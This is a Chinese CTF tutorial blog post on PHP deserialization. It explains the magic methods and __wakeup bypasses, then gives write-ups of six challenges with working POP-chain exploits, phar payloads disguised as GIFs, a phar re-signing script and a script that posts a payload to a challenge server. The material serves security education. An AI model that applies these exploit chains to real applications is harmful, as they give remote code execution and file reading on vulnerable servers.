---
title: PHP反序列化漏洞
date: 2025-12-24 16:41:59
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/6950cbe3a0c391c56de5dcf8.png
categories: CTF
---

# PHP反序列化漏洞

## 1.基础语法

### 1.1 面向对象

**对象实例化**：`$对象名 = new 类名();`

**访问成员**

- 成员方法：`$对象名->成员方法名();`
- 成员变量：`$对象名->成员变量名;`

**`$this` 关键字**：在类内部调用本类的成员变量 / 方法时使用，如 `$this->变量名`/`$this->方法名()`。

### 1.2 序列化与反序列化

序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。

对象------(序列化)------->字符串

将序列化后的参数还原为实例化的对象

对象<------(反序列化)-------字符串

反序列化过程中，unserialize接受的值（字符串）可控；更改这个值（字符串），得到所需要的代码，即生成的对象的属性

## 2.魔术方法

魔术方法是 PHP 预定义的特殊方法，以双下划线`__`开头，满足条件时自动触发。

`__construct()`

- 触发时机：创建对象（实例化类）时自动执行。
- 作用：初始化对象的属性、资源等。

`__destruct()`

- 触发时机：对象被销毁（脚本结束 / 主动 unset）时自动执行。
- 作用：释放资源（如关闭数据库连接、文件句柄）。

`__clone()`

- 触发时机：使用`clone`关键字复制对象时执行。
- 作用：自定义对象克隆的行为，避免浅拷贝问题。

**`__set()`**

- 触发时机：尝试给**不可访问 / 不存在**的成员变量赋值时触发。
- 语法：`public function __set($name, $value) {}`（为变量名，value 为赋值内容）。

**`__get()`**

- 触发时机：尝试获取**不可访问 / 不存在**的成员变量值时触发。
- 语法：`public function __get($name) {}`（$name 为变量名）。

**`__call()`**
- 触发时机：调用 **不存在 / 不可访问（protected/private）**的非静态方法时触发。
- 语法：`public function __call($method, $args) {}`（method为方法名，args 为方法参数数组）。

**`__callStatic()`**

- 触发时机：调用**不存在 / 不可访问**的静态方法时触发。
- 语法：`public static function __callStatic($method, $args) {}`。

**`__toString()`**

- 触发时机：将对象当作字符串使用（如 echo、拼接字符串）时触发。
- 语法：`public function __toString() { return "字符串内容"; }`，必须返回字符串，否则报错。

**`__sleep()`**

- 触发时机：执行`serialize()`序列化对象时触发。
- 作用：指定序列化时需要保存的成员变量，返回值为数组（包含要序列化的变量名）。
- 语法：`public function __sleep() { return ['var1', 'var2']; }`。

**`__wakeup()`**

- 触发时机：执行`unserialize()`反序列化对象时触发。
- 作用：反序列化后恢复对象的状态（如重新建立数据库连接）。
- 语法：`public function __wakeup() {}`。

![](https://pic1.imgdb.cn/item/695080d1161224305eb310dc.png)

![](https://pic1.imgdb.cn/item/695080ec161224305eb310dd.png)

## 3.__wake-up绕过

### 3.1 修改对象属性个数

- PHP5 < 5.6.25
- PHP7 < 7.0.10

```php
<?php
class A{
	var $target = "test";
	function __wakeup(){
		$this->target = "wakeup!";
	}
	function __destruct(){
		$fp = fopen("C:\\phpstudy_pro\\WWW\\unserialize\\shell.php","w");
		fputs($fp,$this->target);
		fclose($fp);
	}
}
 
$test = $_GET['test'];
$test_unseria = unserialize($test);
 
echo "shell.php<br/>";
include(".\shell.php");
?>
```

unserialize( )会检查是否存在一个wakeup( )方法。本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为"wakeup!"。所以我们想绕__ wakeup函数，可以修改序列化字符串中表示对象属性个数的值，修改为大于真实的属性个数就会跳过__wakeup的执行。

### 3.2 php引用赋值

在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。

```php
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }
```

在__wakeup中有一个赋值操作，我们只需要让end和username互相引用，就可以修改username的值。

```php
$a->end = &$a->username;
```

### 3.3 php GC回收机制

原理：当 `is_ref` 减少时，会触发 `__destuct` 魔术方法，由此产生的一些 trick 类型攻击

当对象为`NULL`时也是可以触发`__destruct`的。

在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 `is_ref` 为 0，也就是 false。这就可以触发到 `__destruct` 方法

样例：

```php
<?php
highlight_file(__FILE__);
$flag = "flag{test_flag}";

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = unserialize($_GET['ctf']);
throw new Exception('nonono');
```

这里因为有异常处理，所以正常情况下是无法`__destruct`，这时我们就需要利用GC回收机制来触发`__destruct`。

```php
<?php
highlight_file(__FILE__);

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}
$a=array('a'=>new B,'b'=>NULL);

echo serialize($a);
// a:2:{s:1:"a";O:1:"B":0:{}s:1:"b";N;}
```

得到序列化文本如下

```
a:2:{s:1:"a";O:1:"B":0:{}s:1:"b";N;}
对象类型:对象个数:{类型:长度:键名;类型:长度:类名:值类型:长度:键名;类型;}
数组:对象个数为2:{str型:长度1:键名为"a";类:长度为1:类名为"B":值为0 str型:值为1:键名为"b":NULL型;}
```

这时我们将键名`b`改成`a`，即在反序列化时，会下先让`a`赋值为类`B`，之后再将`a`赋值为`NULL`，但一开始`a`已经是对象了，赋值为`NULL`时就会出现对象为`NULL`的情况，从而触发`__destruct`。

还有一位师傅的做法是

```php
$a=array(new B,0);
```

得到

```
a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
```

再修改i:1为i:0 

### 3.4 fast destruct

参考：[晨曦](https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)



## 4.实战

### 4.1 [BaseCTF2024]Really EZ POP

```php
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```

poc

```php
<?php
class Sink
{
    private $cmd = "system('cat /flag');";
}
class Shark
{
    private $word ;
    public function __construct()
    {
        $this->word=new Sink;
    }
}
class Sea
{
    public $animal;

}
class Nature
{
    public $sea;
}

$a=new Nature();
$a->sea=new Sea();
$a->sea->animal=new Shark();

echo urlencode(serialize($a));

?>
```

由于 php 版本低于 7.1+，这里注意private字段的处理，保留好访问性。

php7.1+反序列化对类属性不敏感，php反序列化private属性时可以在序列化时改成public反序列化依然可以,但是反过来就不行了,如果是public你用private就不行。

### 4.2 [BaseCTF2024]ez_php

```php
<?php
highlight_file(__file__);
function substrstr($data)
{
    $start = mb_strpos($data, "[");
    $end = mb_strpos($data, "]");
    return mb_substr($data, $start + 1, $end - 1 - $start);
}

class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __construct($start){
        $this->start=$start;
    }
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hacker！';
        }
    }
}

class C{
    public $c;
    public function __toString(){
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
        eval($this->r);
    }
}

if(isset($_GET['ez_ser.from_you'])){
    $ctf = new Hacker('{{{'.$_GET['ez_ser.from_you'].'}}}');
    if(preg_match("/\[|\]/i", $_GET['substr'])){
        die("NONONO!!!");
    }
    $pre = isset($_GET['substr'])?$_GET['substr']:"substr";
    $ser_ctf = substrstr($pre."[".serialize($ctf)."]");
    $a = unserialize($ser_ctf);
    throw new Exception("杂鱼~杂鱼~");
}
```

本题综合性很强，考察php反序列化，GC回收，引用赋值，字符串逃逸，特殊变量名传参

先写出pop链

```
destruct->toString->call->get->isset->invoke
```

这里需要用注意到__wakeup中对end进行了赋值，需要用引用赋值绕过它

后面还有一个异常抛出，使得`__destruct`并不能触发，这时就需要使用gc回收的机制，使`__destruct`提前触发，让`pop`链能够往后走

```php
<?php
class Hacker{
    public $start;
    public $end;
    public $username="hacker";
    public function __wakeup(){
        $this->username="hacker";
        $this->end = $this->start;
    }

    public function __destruct(){
        if(!preg_match('/ctfer/i',$this->username)){
            echo 'Hacker！';
        }
    }
}

class C{
    public $c;
    public function __toString(){
                echo "__toString";
        $this->c->c();
        return "C";
    }
}

class T{
    public $t;
    public function __call($name,$args){
                echo "__call";
        echo $this->t->t;
    }
}
class F{
    public $f;
    public function __get($name){
                echo "__get";
        return isset($this->f->f);
    }

}
class E{
    public $e;
    public function __isset($name){
                echo "__isset";
        ($this->e)();
    }

}
class R{
    public $r;

    public function __invoke(){
                echo "__invoke";
        eval($this->r);
    }
}
$a = new Hacker();
$a->end = &$a->username;
$a->start = new C();
$a->start->c = new T();
$a->start->c->t = new F();
$a->start->c->t->f = new E();
$a->start->c->t->f->e = new R();
$a->start->c->t->f->e->r = 'system("cat /f*");';
$b=array('a'=>$a,'b'=>null);
echo serialize($b);
```

```
a:2:{s:1:"a";O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("cat /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}s:1:"b";N;}
```

修改一下

```
a:2:{s:1:"a";O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("cat /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}s:1:"a";N;}
```

接下来是字符串逃逸

题目正常序列化 `serialize($ctf)`，得到

```
O:6:"Hacker":3:{s:5:"start";s:227:"{{{a:2:{s:1:"a";O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("cat /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}s:1:"a";N;}}}}";s:3:"end";N;s:8:"username";s:6:"hacker";}
```

O:6:"Hacker":3:{s:5:"start";s:227:"{ { {是没有用的，后面不用管

利用[mb_strpos与mb_substr执行差异导致的漏洞](https://www.cnblogs.com/gxngxngxn/p/18187578)把前面没用的部分截掉

payload

```
?substr=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&ez[ser.from_you=a:2:{s:1:"a";O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("cat /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:9;}s:1:"a";N;}
```

#### 补充

1.还可以利用fast destruct逃脱异常

```
O:6:"Hacker":3:{s:5:"start";s:203:"{{{O:6:"Hacker":3:{s:5:"start";O:1:"C":1:{s:1:"c";O:1:"T":1:{s:1:"t";O:1:"F":1:{s:1:"f";O:1:"E":1:{s:1:"e";O:1:"R":1:{s:1:"r";s:18:"system("cat /f*");";}}}}}s:3:"end";s:6:"hacker";s:8:"username";R:8;}}}}";s:3:"end";N;s:8:"username";s:6:"hacker";}
```

删去末尾的四个}}}}来破坏序列化字符串结构，利用fast destruct逃脱异常

2.mb_strpos与mb_substr执行差异

```
每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节
每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节
每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节
```



### 4.3 [攻防世界]Web_php_unserialize

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

本题的pop链十分简单，直接利用Demo读取fl4g.php即可，但需要利用cve-2016-7124绕过__wakeup，以及处理好private字段。

接下来是绕过过滤，正则表达式匹配的模式是O:和C:，只需要替换成O+:和C+: 即可

最后再进行base64编码

但是直接把结果丢进工具里编码并不成功，查询资料得知这里的file变量为私有变量，所以序列化之后的字符串开头结 尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结 果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在 php 代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首 部会加上%00*%00。 

```php
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
$a = new Demo("fl4g.php");
//O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
$b=serialize($a);
$b=str_replace('O:4','O:+4',$b);
$b=str_replace('1:{','2:{',$b);
echo base64_encode($b);
```



### 4.4 [BUUCTF]UnserializeOne

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
class Start{
    public $name;
    protected $func;

    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }

    public function __isset($var)
    {
        ($this->func)();
    }
}

class Sec{
    private $obj;
    private $var;

    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }

    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

class Easy{
    public $cla;

    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

class eeee{
    public $obj;

    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

先写出pop链

```
//Start::__destruct -> Sec::__toString -> Easy::__call -> eeee::__clone -> Start::__isset -> Sec::__invoke
```

php7.1+反序列化对类属性不敏感，private属性时可以在序列化时改成public反序列化依然可以,但是反过来就不行了,如果是public你用private就不行。

```php
<?php
class Start{
    public $name;
    public $func;

}

class Sec{
    public $obj;
    public $var;

}

class Easy{
    public $cla;

}

class eeee{
    public $obj;

}

$a = new Start();
$a->name = new Sec();
$a->name->obj = new Easy();
$a->name->var = new eeee();
$a->name->var->obj = new Start();
$a->name->var->obj->func = new Sec();

echo serialize($a);
```

![](https://pic1.imgdb.cn/item/69577f7ec312a4f35ff94e1b.png)



### 4.5 [BUUCTF]UnserializeThree

一打开是一个文件上传系统，查看源码发现class.php

```php
<?php
highlight_file(__FILE__);
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

file_exists($_GET['file']);
```

发现要用phar反序列化和绕过实现RCE

这里 < > ? php和%0a被过滤了，所以不可以用?><?php 来闭合前面的#号了，但我们还可以利用%0d

```php
<?php
class Evil{
    public $cmd;
}
$test = new Evil();
$test->cmd= urldecode("%0d").'system("cat /flag");';

$phar = new Phar("b.phar"); //文件名
$phar->startBuffering();

$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");

$phar->addFromString("test.txt", "test");//不知道为啥，不加这行生成不了.phar文件
$phar->setMetaData($test);
$phar->stopBuffering();
?>
```

上传文件发现.phar被ban了，那就伪装成.gif文件

![](https://pic1.imgdb.cn/item/6957ba2b912e73dbe61268d2.png)



### 4.6 [BUUCTF]UnserializeAgain

查看源码，提示饼干，查看cookie，发现pairing.php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo '多吃雪梨';
}
```

file_put_contents($pear,urldecode($file));是写入文件，结合后面的file_exists，可以利用phar反序列化

```php
<?php
class story{
    private $user;
    public $pass;
    public $eating;
    public $God;
}

$a=new story();
$a->God=true;
$a->eating='cat /*';
$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

![](https://pic1.imgdb.cn/item/6957df58912e73dbe61273a2.png)

用010修改一下绕__wakeup

重新签名

```python
from hashlib import sha1
with open('1.phar', 'rb') as file:
    f = file.read()  #打开名为1.phar的文件，以二进制只读模式读取文件内容，并将其存储到变量f中
s = f[:-28]  # 获取要签名的数据（s）
h = f[-8:]  # 获取签名类型和GBMB标识（h）
newf = s + sha1(s).digest() + h # 对要签名的数据进行SHA-1哈希计算，并将原始数据、签名和类型/标识拼接成新的数据newf
with open('2.phar', 'wb') as file:
    file.write(newf)

# 将处理后的数据newf写入到一个名为newtest.phar的新文件中，以二进制写入模式。
```

提交

```python
import urllib.parse
import os
import re
import requests
u="http://7edfddeb-3d9f-4b5f-8f16-f66f6afc520d.node5.buuoj.cn:81/pairing.php?pear=1.phar&apple=phar://1.phar"
with open('2.phar','rb') as fi:
    f = fi.read()
    ff=urllib.parse.quote(f)
    print(ff) 
    fin=requests.post(url=u,data=ff)
    
print(fin.text)
```



## 参考文献

[PHP GC 回收机制学习 | Drunkbaby's Blog](https://drun1baby.top/2022/11/13/PHP-GC-回收机制学习/)

[深入浅出PHP反序列化](https://xz.aliyun.com/news/14565)

[php反序列化](https://www.cnblogs.com/lktop666/articles/18581571)
